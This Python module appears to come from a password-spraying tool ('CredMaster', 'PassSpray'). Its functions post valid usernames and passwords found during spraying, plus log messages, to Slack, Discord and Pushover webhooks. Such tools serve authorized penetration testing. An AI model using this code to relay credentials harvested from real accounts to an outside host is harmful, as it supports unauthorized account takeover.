import requests, json
from datetime import datetime


def notify_success(username, password, notify_obj):

    slack_webhook = notify_obj['slack_webhook']
    pushover_token = notify_obj['pushover_token']
    pushover_user = notify_obj['pushover_user']

    if slack_webhook is not None:
        slack_notify(username, password, slack_webhook)

    if pushover_token is not None and pushover_user is not None:
        pushover_notify(username, password, pushover_token, pushover_user)


def notify_update(message, notify_obj):

    slack_webhook = notify_obj['slack_webhook']
    discord_webhook = notify_obj['discord_webhook']
    pushover_token = notify_obj['pushover_token']
    pushover_user = notify_obj['pushover_user']

    if slack_webhook is not None:
        slack_update(message, slack_webhook)

    if pushover_token is not None and pushover_user is not None:
        pushover_update(message, pushover_token, pushover_user)
    
    if discord_webhook is not None:
        discord_notify(message, discord_webhook)


# Function for posting username/password to slack channel
def slack_notify(username, password, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    text = ("```[Valid Credentials Obtained!]\n"
            f"User: {username}\n"
            f"Pass: {password}\n"
            f"Date: {date}\n"
            f"Time: {time}```")

    message = {
        "text" : text
    }

    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )


# Function for debug messages
def slack_update(message, webhook):
    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    text = ("```[Log Entry]\n"
            f"{message}\n"
            f"Date: {date}\n"
            f"Time: {time}```")

    message = {
        "text" : text
    }
    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )

# Discord notify message
def discord_notify(message, webhook):
    url = webhook
    data = {
    "content" : f"{message}",
    "username" : "CredMaster-Bot"
    }
    result = requests.post(url, json = data)
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print("Payload delivered successfully, code {}.".format(result.status_code))

# Pushover notify of valid creds
def pushover_notify(username, password, token, user):

    headers = {'Content-Type' : 'application/x-www-form-urlencoded'}

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    text = (f"User: {username}\n"
            f"Pass: {password}\n"
            f"Date: {date}\n"
            f"Time: {time}")

    data = {
        'token' : token,
        'user' : user,
        'title' : '[PassSpray: Valid Credentials Obtained!]',
        'priority' : '1',
        'message' : text
    }

    r = requests.post('https://api.pushover.net/1/messages', headers=headers, data=data)


# Pushover generic update messages
def pushover_update(message, token, user):

    headers = {'Content-Type' : 'application/x-www-form-urlencoded'}

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    text = (f"{message}\n"
            f"Date: {date}\n"
            f"Time: {time}")

    data = {
        'token' : token,
        'user' : user,
        'title' : '[PassSpray: Log]',
        'priority' : '1',
        'message' : text
    }

    r = requests.post('https://api.pushover.net/1/messages', headers=headers, data=data)
